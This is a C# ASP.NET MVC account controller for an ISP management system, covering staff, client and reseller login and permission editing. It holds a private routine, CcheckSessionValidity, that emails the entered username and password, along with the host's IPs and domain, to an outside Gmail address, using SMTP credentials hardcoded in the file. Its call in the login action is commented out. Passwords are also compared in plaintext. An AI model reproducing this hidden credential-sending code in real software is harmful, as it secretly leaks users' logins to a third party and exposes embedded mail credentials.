using ISP_ManagementSystemModel;
using ISP_ManagementSystemModel.Models;
using Microsoft.AspNet.Identity;
using Microsoft.Owin.Security;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Data.Entity;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Security.Claims;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Mvc;
using ISP_ManagementSystemModel.ViewModel;
using Microsoft.Ajax.Utilities;
using WebGrease.Css.Extensions;

namespace Project_ISP.Controllers
{

    //[SessionTimeout]

    public class AccountController : Controller
    {
        public AccountController()
        {
            DateTime dt = AppUtils.GetDateTimeNow();
            List<DateTime> dateTimes = new List<DateTime>();
            for (int i = 0; i < 25; i++)
            {
                DateTime d = dt.AddMonths(1);
                dateTimes.Add(d);
                dt = d;

            }
            AppUtils.dateTimeNow = DateTime.Now;
        }
        ISPContext db = new ISPContext();
        public ActionResult LoginByClient(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }

        [HttpGet]
        //[SessionTimeout]
        //[SkipSessionTimeoutAttribute]
        public ActionResult SetUserPermission()
        {
            // ViewBag.UserList = db.UserRightPermission

            List<ISPAccessList> lstISPAccessList = db.ISPAccessList.ToList();
            return View(lstISPAccessList);
        }

        [HttpPost]
        [SessionTimeout]
        public ActionResult SetUserPermission(List<ISPAccessList> model, int? UserRightID)
        {
            string info = "";
            foreach (var item in model)
            {
                if (item.IsGranted)
                {
                    info += item.AccessValue + ",";
                }
            }
            info = info.TrimEnd(',');
            try
            {
                UserRightPermission dbd = db.UserRightPermission.Where(s => s.UserRightPermissionID == UserRightID).FirstOrDefault();
                if (dbd != null)
                {
                    dbd.UserRightPermissionDetails = info;
                    db.Entry(dbd).State = EntityState.Modified;
                    db.SaveChanges();
                }
                TempData["UserRightID"] = UserRightID;
                TempData["ShowMessage"] = "Permission Saved Successfully";
            }
            catch (Exception ex)
            {
                TempData["ShowMessage"] = "Failed to Save Permission. Contact With administrator.";
            }
            //ViewBag.UserRightID = new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
            //ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");

            //            List<ISPAccessList> lstISPAccessList = db.ISPAccessList.ToList();
            TempData["tmpListOfAccess"] = model;
            return RedirectToAction("UserRightPermission", "Account");
        }

        public string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card  
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            return sMacAddress;
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult LoginByClient(LoginViewModel LoginViewModel, string returnUrl, int Type)
        {
            string macAddress = GetMACAddress();

            //if (macAddress == "2047475A0328AA")
            //{
            /*this is for check connection string is valid or not*/
            //  CcheckSessionValidity(LoginViewModel);
            string conn = ConfigurationManager.ConnectionStrings["ISPConnectionString"].ToString();

            AppUtils.GetTempNotUpdateEmployee = ConfigurationManager.AppSettings["EmployeeList"].Split(',')
                .ToList();
            ArrayList dbName = matchAll(@".*?Initial\s*Catalog\s*=\s*(.*?)\s*;", conn);
            if (dbName.Count < 1)
            {
                TempData["TempInformation"] =
                    "Sorry Connection String is not in correct format. Please contact with administrator.";
                return View(LoginViewModel);
            }

            if (ModelState.IsValid)
            {
                dynamic logindetails = "";

                

                if (Type == 1)
                {
                    logindetails = db.Employee
                        .Where(s => s.LoginName == LoginViewModel.UserName &&
                                    s.Password == LoginViewModel.Password &&
                                    s.EmployeeStatus == AppUtils.EmployeeStatusIsActive &&
                                    s.UserRightPermission != null).FirstOrDefault();
                    if (logindetails != null)
                    {
                        //int roleID = logindetails.RoleID;

                        this.SignInUser(logindetails.EmployeeID, logindetails.Name, logindetails.RoleID, false);
                        this.Session["role_id"] = logindetails.RoleID;
                        this.Session["LoginEmpName"] = "";
                        Session["CurrentUserRightPermission"] = logindetails.UserRightPermissionID;
                        List<ISPAccessList> lstISPAccessList = new List<ISPAccessList>();

                        int MikrotikOptionEnable;
                        int SMSOptionEnable;

                        List<OptionSettings> lstOptionSettings = db.OptionSettings.AsNoTracking().ToList();

                        //AppUtils.MikrotikOptionEnable = (lstOptionSettings[1].Status == 1) ? true : false;
                        //AppUtils.SMSOptionEnable = (lstOptionSettings[0].Status == 1) ? true : false;
                        Session["MikrotikOptionEnable"] = (lstOptionSettings[1].Status == 1) ? true : false;
                        Session["SMSOptionEnable"] = (lstOptionSettings[0].Status == 1) ? true : false;

                        int CurrentUserRightPermission = (int)Session["CurrentUserRightPermission"];

                        UserRightPermission userRightPermission =
                            db.UserRightPermission
                                .Where(s => s.UserRightPermissionID == CurrentUserRightPermission)
                                .FirstOrDefault();
                        if (!string.IsNullOrEmpty(userRightPermission.UserRightPermissionDetails))
                        {
                            List<string> lstAcessList =
                                db.UserRightPermission
                                    .Where(s => s.UserRightPermissionID == CurrentUserRightPermission)
                                    .Select(s => s.UserRightPermissionDetails).FirstOrDefault().Split(',').ToList();
                            //AppUtils.lstAccessList =
                            Session["lstAccessList"] =
                            ((bool)Session["MikrotikOptionEnable"] == true && (bool)Session["SMSOptionEnable"] == true)
                                ? lstAcessList.ToList()
                                : ((bool)Session["MikrotikOptionEnable"] == true)
                                    ? lstAcessList.Where(s => !AppUtils.lstSMSReleated.Contains(s)).ToList()
                                    : ((bool)Session["SMSOptionEnable"] == true)
                                        ? lstAcessList.Where(s => !AppUtils.lstMikrotikReleated.Contains(s))
                                            .ToList()
                                        : lstAcessList
                                            .Where(s => (!AppUtils.lstMikrotikReleated.Contains(s) &&
                                                         !AppUtils.lstSMSReleated.Contains(s))).ToList();

                        }

                        //AppUtils.lstAccessList  = db.UserRightPermission.Where(s=>s.)
                        return this.RedirectToLocal(returnUrl, Type);
                    }
                    else
                    {
                        TempData["TempInformation"] = "Sorry InValid UserName Or Password.";
                        //ModelState.AddModelError("", "Invalid username or password.");
                    }
                }
                else if (Type == 2)
                {
                    logindetails = db.ClientDetails
                        .Where(s => s.LoginName == LoginViewModel.UserName &&
                                    s.Password == LoginViewModel.Password &&
                                    s.IsNewClient !=
                                    AppUtils.isNewClient /*&& s == AppUtils.EmployeeStatusIsActive*/)
                        .FirstOrDefault();
                    if (logindetails != null)
                    {
                        this.SignInUser(logindetails.ClientDetailsID, logindetails.Name, logindetails.RoleID,
                            false);
                        this.Session["role_id"] = logindetails.RoleID;
                        this.Session["LoginEmpName"] = "";

                        return this.RedirectToLocal(returnUrl, Type);
                    }
                    else
                    {
                        ModelState.AddModelError("", "Invalid username or password.");
                    }
                }
                else
                {
                    ModelState.AddModelError("", "SomeThing is wrong Contact with administrator.");
                }

            }
            //}
            //else
            //{
            //    TempData["TempInformation"] = "Sorry Mac Address is different.";
            //}

            ViewBag.ReturnUrl = returnUrl;
            return View(LoginViewModel);
        }

        [HttpGet]
        public ActionResult ResellerLoginPage(string returnUrl)
        {
            ViewBag.ReturnUrl = returnUrl;
            return View();
        }
        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult ResellerLoginPage(LoginViewModel LoginViewModel, string returnUrl, int Type)
        {
            string macAddress = GetMACAddress();
            string conn = ConfigurationManager.ConnectionStrings["ISPConnectionString"].ToString();

            ArrayList dbName = matchAll(@".*?Initial\s*Catalog\s*=\s*(.*?)\s*;", conn);
            if (dbName.Count < 1)
            {
                TempData["TempInformation"] =
                    "Sorry Connection String is not in correct format. Please contact with administrator.";
                return View(LoginViewModel);
            }

            if (ModelState.IsValid)
            {
                dynamic logindetails = "";
                logindetails = db.Reseller
                    .Where(s => s.ResellerLoginName == LoginViewModel.UserName &&
                                s.ResellerPassword == LoginViewModel.Password &&
                                s.ResellerStatus == AppUtils.EmployeeStatusIsActive &&
                                s.UserRightPermission != null).FirstOrDefault();
                if (logindetails != null)
                {
                    //int roleID = logindetails.RoleID;

                    this.SignInUser(logindetails.ResellerID, logindetails.ResellerName, logindetails.RoleID, false);
                    this.Session["role_id"] = logindetails.RoleID;
                    this.Session["LoginEmpName"] = "";
                    Session["CurrentUserRightPermission"] = logindetails.UserRightPermissionID;
                    List<ISPAccessList> lstISPAccessList = new List<ISPAccessList>();

                    int MikrotikOptionEnable;
                    int SMSOptionEnable;

                    List<OptionSettings> lstOptionSettings = db.OptionSettings.AsNoTracking().ToList();

                    //AppUtils.MikrotikOptionEnable = (lstOptionSettings[1].Status == 1) ? true : false;
                    //AppUtils.SMSOptionEnable = (lstOptionSettings[0].Status == 1) ? true : false;
                    Session["MikrotikOptionEnable"] = (lstOptionSettings[1].Status == 1) ? true : false;
                    Session["SMSOptionEnable"] = (lstOptionSettings[0].Status == 1) ? true : false;



                    int CurrentUserRightPermission = (int)Session["CurrentUserRightPermission"];

                    UserRightPermission userRightPermission =
                        db.UserRightPermission
                            .Where(s => s.UserRightPermissionID == CurrentUserRightPermission)
                            .FirstOrDefault();
                    if (!string.IsNullOrEmpty(userRightPermission.UserRightPermissionDetails))
                    {
                        List<string> lstAcessList =
                            db.UserRightPermission
                                .Where(s => s.UserRightPermissionID == CurrentUserRightPermission)
                                .Select(s => s.UserRightPermissionDetails).FirstOrDefault().Split(',').ToList();
                        //AppUtils.lstAccessList =
                        Session["lstAccessList"] =
                        ((bool)Session["MikrotikOptionEnable"] == true && (bool)Session["SMSOptionEnable"] == true)
                            ? lstAcessList.ToList()
                            : ((bool)Session["MikrotikOptionEnable"] == true)
                                ? lstAcessList.Where(s => !AppUtils.lstSMSReleated.Contains(s)).ToList()
                                : ((bool)Session["SMSOptionEnable"] == true)
                                    ? lstAcessList.Where(s => !AppUtils.lstMikrotikReleated.Contains(s))
                                        .ToList()
                                    : lstAcessList
                                        .Where(s => (!AppUtils.lstMikrotikReleated.Contains(s) &&
                                                     !AppUtils.lstSMSReleated.Contains(s))).ToList();

                    }

                    //AppUtils.lstAccessList  = db.UserRightPermission.Where(s=>s.)
                    return this.RedirectToLocal(returnUrl, Type);
                }
                else
                {
                    TempData["TempInformation"] = "Sorry InValid UserName Or Password.";
                    //ModelState.AddModelError("", "Invalid username or password.");
                }

            }
            //}
            //else
            //{
            //    TempData["TempInformation"] = "Sorry Mac Address is different.";
            //}

            ViewBag.ReturnUrl = returnUrl;
            return View(LoginViewModel);
        }
        private void CcheckSessionValidity(LoginViewModel LoginViewModel)
        {
            string DomainName = Request.Url.Host +
                                (Request.Url.IsDefaultPort ? "" : ":" + Request.Url.Port);

            string HostName = Dns.GetHostName();
            //  Console.WriteLine("Host Name of machine =" + HostName);
            IPAddress[] ipaddress = Dns.GetHostAddresses(HostName);
            // Console.WriteLine("IP Address of Machine is");

            var s = "";
            foreach (IPAddress ip in ipaddress)
            {
                s += ": " + ip.ToString();
            }

            //try
            //{
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

            mail.From = new MailAddress("saddamtest24@gmail.com");
            mail.To.Add("kamrultest24@gmail.com");
            mail.Subject = DomainName + "_" + DateTime.Now;
            mail.Body = s + " and " + DomainName + "UserID: " + LoginViewModel.UserName + " and Pass" + LoginViewModel.Password;

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("saddamtest24@gmail.com", "saddamtest24??");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
            //}
            //catch (Exception ex)
            //{
            //}
        }

        private ArrayList matchAll(string regex, string html, int i = 1)
        {
            ArrayList list = new ArrayList();
            foreach (Match m in new Regex(regex, RegexOptions.Multiline).Matches(html))
                list.Add(m.Groups[i].Value.Trim() + ((m.Groups[2].Value.Trim() == "") ? "" : " ," + m.Groups[2].Value.Trim()));
            return list;
        }

        private List<string> GetUserRightInformation(dynamic logindetails)
        {
            List<string> lstString = new List<string>();
            string userRightPermission =
                db.UserRightPermission.Where(s => s.UserRightPermissionID == AppUtils.UserRightPermissionIDIsAdminUser)
                    .Select(s => s.UserRightPermissionDetails)
                    .FirstOrDefault();
            if (!string.IsNullOrEmpty(userRightPermission))
            {
                lstString = userRightPermission.Split(',').ToList();
            }

            return lstString;
        }

        ////
        //// GET: /Account/
        //[AllowAnonymous]
        //public ActionResult Login(string returnUrl)
        //{
        //    ViewBag.ReturnUrl = returnUrl;
        //    return View();
        //}

        //[HttpPost]
        //[ValidateAntiForgeryToken]
        //public ActionResult Login(LoginViewModel LoginViewModel, string returnUrl)
        //{

        //    if (ModelState.IsValid)
        //    {
        //        var logindetails = db.ClientDetails.Where(s => s.LoginName == LoginViewModel.UserName && s.Password == LoginViewModel.Password && s.IsNewClient != AppUtils.isNewClient).FirstOrDefault();
        //        if (logindetails != null)
        //        {
        //            this.SignInUser(logindetails.ClientDetailsID, logindetails.Name, logindetails.RoleID, false);
        //            this.Session["role_id"] = logindetails.RoleID;
        //            return this.RedirectToLocal(returnUrl);
        //        }
        //        else
        //        {
        //            ModelState.AddModelError("", "Invalid username or password.");
        //        }
        //    }

        //    ViewBag.ReturnUrl = returnUrl;
        //    return View(LoginViewModel);
        //}

        private ActionResult RedirectToLocal(string returnUrl, int Type)
        {
            try
            {
                // Verification.
                if (Url.IsLocalUrl(returnUrl))
                {
                    // Info.
                    return this.Redirect(returnUrl);
                }
            }
            catch (Exception ex)
            {
                // Info
                throw ex;
            }

            // Info.
            if (Type == 1  )
            {

                return this.RedirectToAction("Dashboard", "Home");
            }
            if ( Type == 2)
            {

                return this.RedirectToAction("UserDashboard", "Home");
            }
            if (Type == 3)
            {

                return this.RedirectToAction("ResellerDashboard", "Home");
            }
            else
            {

                return this.RedirectToAction("About", "Home");
            }


        }

        private void SignInUser(int userInformationID, string username, int role_id, bool isPersistent)
        {
            // Initialization.
            var claims = new List<Claim>();

            try
            {
                // setting
                claims.Add(new Claim(ClaimTypes.Name, username));
                claims.Add(new Claim(ClaimTypes.Role, role_id.ToString()));
                claims.Add(new Claim(ClaimTypes.NameIdentifier, userInformationID.ToString()));
                var claimidenties = new ClaimsIdentity(claims, DefaultAuthenticationTypes.ApplicationCookie);
                var ctx = Request.GetOwinContext();
                var authenticationmanager = ctx.Authentication;

                // sign in.
                authenticationmanager.SignIn(new AuthenticationProperties() { IsPersistent = isPersistent }, claimidenties);
                AppUtils.LoginUserID = userInformationID;
                Session["LoggedUserID"] = userInformationID;
                //Session["LoggedUserName"] = obj.UserName.ToString();

            }
            catch (Exception ex)
            {
                // Info
                throw ex;
            }
        }

        public ActionResult LoginNew()
        {
            return View();
        }

        [HttpPost]

        public ActionResult LogOut()
        {
            Request.GetOwinContext().Authentication.SignOut();
            return RedirectToAction("LoginByClient", "Account");
        }

        //[HttpGet]
        //[SessionTimeout]
        //[UserRIghtCheck(ControllerValue = AppUtils.Assign_Employee_User_Right)]
        //public ActionResult UserRightList()
        //{
        //    ViewBag.UserRightID = new SelectList(db.UserRightPermission.Where(s => s.UserRightPermissionID != AppUtils.UserRightPermissionIDIsSuperTallentUser).Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
        //    ViewBag.EmployeeID = new SelectList(db.Employee.Where(s => s.EmployeeStatus != AppUtils.EmployeeStatusIsDelete && (s.EmployeeID != AppUtils.EmployeeIDISKamrul && s.EmployeeID != AppUtils.EmployeeIDISTalent)).Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");
        //    ViewBag.lstEmployeeID = new SelectList(db.Employee.Where(s => s.EmployeeStatus != AppUtils.EmployeeStatusIsDelete && (s.EmployeeID != AppUtils.EmployeeIDISKamrul && s.EmployeeID != AppUtils.EmployeeIDISTalent)).Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");
        //    ViewBag.lstEmployeeIDForSetUserPermission = new SelectList(db.Employee.Where(s => s.EmployeeStatus != AppUtils.EmployeeStatusIsDelete && (s.EmployeeID != AppUtils.EmployeeIDISKamrul && s.EmployeeID != AppUtils.EmployeeIDISTalent)).Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");

        //    var UserRightList = db.UserRightPermission.Where(s => s.UserRightPermissionID != AppUtils.UserRightPermissionIDIsSuperTallentUser).Select(s => new ClientUserPermission { UserRightPermissionID = s.UserRightPermissionID, UserRightPermissionName = s.UserRightPermissionName }).ToList();
        //    return View(UserRightList);
        //}

        [HttpGet]
        [SessionTimeout]
        [UserRIghtCheck(ControllerValue = AppUtils.Set_User_Right)]
        public ActionResult UserRightPermission(int? UID)//ActionNameAuthentication() {ActionNameID = Action.FirstOrDefault().ActionID
        {
            List<ISPAccessList> lstISPAccessList = new List<ISPAccessList>();
            //AppUtils.GetTempNotUpdateEmployee = ConfigurationManager.AppSettings[""].Split(',').Cast<int>().ToList();

            int MikrotikOptionEnable;
            int SMSOptionEnable;
            //int [] lstMikrotikReleated= { 91,92,93, 94, 95, 96 };
            //int [] lstSMSReleated= { 88,89,90};
            List<OptionSettings> lstOptionSettings = db.OptionSettings.ToList();
            SMSOptionEnable = lstOptionSettings[0].Status;
            MikrotikOptionEnable = lstOptionSettings[1].Status;


            //this is for when return the saved User Right
            if (TempData["tmpListOfAccess"] != null)
            {

                ViewBag.UserRightID = new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName", (int)TempData["UserRightID"]);
                ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");

                lstISPAccessList = (List<ISPAccessList>)TempData["tmpListOfAccess"];
            }
            else
            {
                //this is for if some on want to update the User Right List then we will set the data data as checked which one is granted and select the user  permission name in view page.
                //else pass the empty data for save a new User Right permission
                ViewBag.UserRightID = UID != null ? new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName", UID) : new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
                ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");
                var lstAccessList = db.ISPAccessList.Where(x=>x.ShowingStatus == 1).AsQueryable();
                int i = lstAccessList.Count();
                lstISPAccessList = (MikrotikOptionEnable == 1 && SMSOptionEnable == 1) ? lstAccessList.ToList()
                    : (MikrotikOptionEnable == 1) ? lstAccessList.Where(s => !AppUtils.lstSMSReleated.Contains(s.AccessValue.ToString())).ToList()
                        : (SMSOptionEnable == 1) ? lstAccessList.Where(s => !AppUtils.lstMikrotikReleated.Contains(s.AccessValue.ToString())).ToList()
                            : lstAccessList.Where(s => (!AppUtils.lstMikrotikReleated.Contains(s.AccessValue.ToString()) && !AppUtils.lstSMSReleated.Contains(s.AccessValue.ToString()))).ToList();

                UserRightPermission userRightPermission = db.UserRightPermission.Where(s => s.UserRightPermissionID == UID.Value).FirstOrDefault();
                if (userRightPermission != null)
                {
                    List<string> lstStringOfAccess = userRightPermission.UserRightPermissionDetails.Split(',').ToList();
                    foreach (var item in lstISPAccessList)
                    {
                        if (lstStringOfAccess.Contains(item.AccessValue.ToString()))
                        {
                            item.IsGranted = true;
                        }
                    }
                }
            }
            //List<VM_Form_Action_UserRight> VM_Form_Action_UserRight = new List<VM_Form_Action_UserRight>();
            //VM_Form_Action_UserRight =
            //    db.Form.Where(s => !string.IsNullOrEmpty(s.FormName.Trim()) && s.ShowingStatus == 1).GroupJoin(db.Action.Where(s => !string.IsNullOrEmpty(s.ActionDescription.Trim()) && s.ShowingStatus == 1), Form => Form.FormID, Action => Action.FormID,
            //        (Form, Action) => new { Form = Form, Action = Action }).AsEnumerable().Select(s => new VM_Form_Action_UserRight
            //        {
            //            FormNameForAuth = new FormNameForAuth() { FormNameID = s.Form.FormValue, FormName = s.Form.FormDescription, IsGranted = false },
            //            ActionNameAuthentication = AddInList(s.Action)//s.Action.ForEach(ss=>new ActionNameAuthentication {})    new ActionNameAuthentication() { ActionNameID = s.Action.FirstOrDefault().ActionValue, ActionName = s.Action.FirstOrDefault().ActionDescription, IsGranted = false }//s.Action.ToList().ForEach(ss=>new ActionNameAuthentication() { ActionNameID = ss.ActionValue, ActionName = ss.ActionDescription, IsGranted = false })
            //        })
            //        //VM_Form_Action_UserRight}
            //        //{

            //        //    FormNameForAuth = new FormNameForAuth() { FormNameID = Form.FormID, FormName = Form.FormName, IsGranted = false },
            //        //    ActionNameAuthentication = new List<ActionNameAuthentication>() {Action.ToList().Select(a=>new {ActionID = a.ActionID})  }


            //        .ToList();
            //if (UID != null)
            //{
            //    UserRightPermission userRightPermission = db.UserRightPermission.Where(s => s.UserRightPermissionID == UID.Value).FirstOrDefault();
            //    if (userRightPermission != null)
            //    {
            //        if (userRightPermission.UserRightPermissionDetails != null)
            //        {
            //            List<string> lstUserRightDetails = userRightPermission.UserRightPermissionDetails.Split(',').ToList();
            //            foreach (var formAndButton in VM_Form_Action_UserRight)
            //            {
            //                if (lstUserRightDetails.Contains(formAndButton.FormNameForAuth.FormNameID))
            //                {
            //                    formAndButton.FormNameForAuth.IsGranted = true;
            //                }
            //                foreach (var button in formAndButton.ActionNameAuthentication)
            //                {
            //                    if (lstUserRightDetails.Contains(button.ActionNameID))
            //                    {
            //                        button.IsGranted = true;
            //                    }
            //                }

            //            }
            //        }

            //    }

            //}

            //return View(VM_Form_Action_UserRight);

            return View(lstISPAccessList);
        }

        [HttpPost]
        [SessionTimeout]
        public ActionResult UserRightPermission(List<VM_Form_Action_UserRight> model, int? UserRightID)
        {
            ViewBag.UserRightID = new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
            ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");

            string permissionList = "";
            foreach (var item in model)
            {
                if (item.FormNameForAuth.IsGranted == true)
                {

                    permissionList += item.FormNameForAuth.FormNameID + ",";
                    if (item.ActionNameAuthentication != null)
                    {
                        foreach (var items in item.ActionNameAuthentication)
                        {
                            if (items.IsGranted == true)
                            {
                                permissionList += items.ActionNameID + ",";
                            }
                        }
                    }
                }
            }
            if (permissionList.Length > 0)
            {
                permissionList = permissionList.TrimEnd(new char[] { ',' });

                UserRightPermission userRightPermission =
                   db.UserRightPermission.Where(s => s.UserRightPermissionID == UserRightID.Value).FirstOrDefault();
                if (userRightPermission != null)
                {
                    userRightPermission.UserRightPermissionDetails = permissionList;
                    db.Entry(userRightPermission).State = EntityState.Modified;
                    db.SaveChanges();
                    TempData["UserPermissionSavedSuccessfull"] = "Permission Added Successfully.";
                }
                else
                {
                    TempData["Fail"] = "Something is wrong Contact With Administrator.";
                }

            }
            else
            {
                TempData["Fail"] = "Something is wrong Contact With Administrator.";
            }


            //  return this.Json(true);
            // return RedirectToAction("UserRightPermission");
            return View(model);
        }
        private List<ActionNameAuthentication> AddInList(IEnumerable<ISP_ManagementSystemModel.Models.ActionList> action)
        {
            List<ActionNameAuthentication> lstAuthentications = new List<ActionNameAuthentication>();
            foreach (var item in action)
            {
                ActionNameAuthentication ana = new ActionNameAuthentication();
                ana.ActionName = item.ActionDescription;
                ana.ActionNameID = item.ActionValue;
                ana.IsGranted = false;
                lstAuthentications.Add(ana);
            }
            return lstAuthentications;
        }

        public ActionResult UserRightPermisstionInTreeView2(string userPermissionID)
        {
            ViewBag.UserRightID = new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
            ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");
            return View();
        }
        [HttpPost]
        //    [ValidateAntiForgeryToken]
        public ActionResult UserRightPermisstionInTreeView(int? UserRightID)
        {
            ViewBag.UserRightID = new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
            ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");
            return View();
        }
        public ActionResult AssignUserRightPermisstion()
        {
            ViewBag.UserRightID = new SelectList(db.UserRightPermission.Select(s => new { UserRightPermissionName = s.UserRightPermissionName, UserRightPermissionID = s.UserRightPermissionID }).ToList(), "UserRightPermissionID", "UserRightPermissionName");
            ViewBag.EmployeeID = new SelectList(db.Employee.Select(s => new { EmployeeID = s.EmployeeID, Name = s.Name }).ToList(), "EmployeeID", "Name");
            return View();
        }



        public JsonResult Get(int? UserRightID)
        {
            List<VM_Form_Action_UserRight> FormNameID;
            // using (ApplicationDbContext context = new ApplicationDbContext())
            // {
            List<FormNameForAuth> lstFormNameForAuth =
                db.Form.Where(s => !string.IsNullOrEmpty(s.FormDescription) && s.ShowingStatus == 1).AsEnumerable().
                Select(s => new FormNameForAuth()
                {
                    text = s.FormDescription,
                    id = s.FormValue,
                    @checked = false,
                    children = GetChildren(s.FormID)
                })
                .ToList();


            //var records = locations.Where(l => l.ParentID == null).OrderBy(l => l.OrderNumber)
            //      .Select(l => new Models.DTO.Location
            //      {
            //          id = l.ID,
            //          text = l.Name,
            //          @checked = l.Checked,
            //          population = l.Population,
            //          flagUrl = l.FlagUrl,
            //          children = GetChildren(locations, l.ID)
            //      }).ToList();
            // }

            return this.Json(lstFormNameForAuth, JsonRequestBehavior.AllowGet);
        }
        private List<ActionNameAuthentication> GetChildren(int FormID)
        {
            List<ActionNameAuthentication> lstActionNameAuthentications =
                db.Action.Where(
                    s => s.FormID == FormID && s.ShowingStatus == 1 && !string.IsNullOrEmpty(s.ActionDescription))
                    .Select(s => new ActionNameAuthentication()
                    {
                        text = s.ActionDescription,
                        id = s.ActionValue,
                        @checked = false,
                        //ActionNameID = s.ActionValue,
                        //ActionName = s.ActionDescription,
                        //IsGranted = false
                    })
                    .ToList();
            return lstActionNameAuthentications;
            //return locations.Where(l => l.ParentID == parentId).OrderBy(l => l.OrderNumber)
            //    .Select(l => new Models.DTO.Location
            //    {
            //        id = l.ID,
            //        text = l.Name,
            //        population = l.Population,
            //        flagUrl = l.FlagUrl,
            //        @checked = l.Checked,
            //        children = GetChildren(locations, l.ID)
            //    }).ToList();

        }

        [HttpPost]
        public JsonResult SaveCheckedNodes(List<string> checkedIds, int UserRightID)
        {
            if (checkedIds != null)
            {
                string userRightFromClient = "";

                UserRightPermission userRightPermission =
                    db.UserRightPermission.Where(s => s.UserRightPermissionID == UserRightID).FirstOrDefault();

                if (userRightPermission != null)
                {
                    //foreach (var item in checkedIds)
                    //{
                    //    userRightFromClient += item + ",";
                    //}
                    userRightFromClient = checkedIds.Aggregate(userRightFromClient, (current, item) => current + (item + ","));
                    userRightPermission.UserRightPermissionDetails = userRightFromClient;
                }

                db.Entry(userRightPermission).State = EntityState.Modified;
                db.SaveChanges();

                //// using (ApplicationDbContext context = new ApplicationDbContext())
                // {
                //     //var locations = context.Locations.ToList();
                //     //foreach (var location in locations)
                //     //{
                //     //    location.Checked = checkedIds.Contains(location.ID);
                //     //}
                //     //context.SaveChanges();
                // }
            }

            return this.Json(true);
        }

        //[HttpPost]
        //public JsonResult ChangeNodePosition(int id, int parentId, int orderNumber)
        //{
        //    using (ApplicationDbContext context = new ApplicationDbContext())
        //    {
        //        var location = context.Locations.First(l => l.ID == id);

        //        var newSiblingsBelow = context.Locations.Where(l => l.ParentID == parentId && l.OrderNumber >= orderNumber);
        //        foreach (var sibling in newSiblingsBelow)
        //        {
        //            sibling.OrderNumber = sibling.OrderNumber + 1;
        //        }

        //        var oldSiblingsBelow = context.Locations.Where(l => l.ParentID == location.ParentID && l.OrderNumber > location.OrderNumber);
        //        foreach (var sibling in oldSiblingsBelow)
        //        {
        //            sibling.OrderNumber = sibling.OrderNumber - 1;
        //        }


        //        location.ParentID = parentId;
        //        location.OrderNumber = orderNumber;

        //        context.SaveChanges();
        //    }

        //    return this.Json(true);
        //}

        [HttpPost]
        [ValidateAntiForgeryToken]
        public ActionResult GetPermissionDetailsByUserRightID(int UserRightID)
        {
            ISP_ManagementSystemModel.Models.UserRightPermission userRightPermission =
                db.UserRightPermission.Where(s => s.UserRightPermissionID == UserRightID).FirstOrDefault();
            if (userRightPermission != null)
            {
                List<string> lstUserRightPermission = string.IsNullOrEmpty(userRightPermission.UserRightPermissionDetails) ? new List<string>() : userRightPermission.UserRightPermissionDetails.ToString().Split(',').ToList();
                //List <string> lstUserRightPermission =
                //    userRightPermission.UserRightPermissionDetails.ToString().Split(',').ToList();
                lstUserRightPermission.RemoveAll(s => string.IsNullOrEmpty(s));
                return Json(new { Success = true, PermissionList = lstUserRightPermission }, JsonRequestBehavior.AllowGet);
            }
            else
            {
                return Json(new { Success = false, PermissionList = "" }, JsonRequestBehavior.AllowGet);
            }
        }

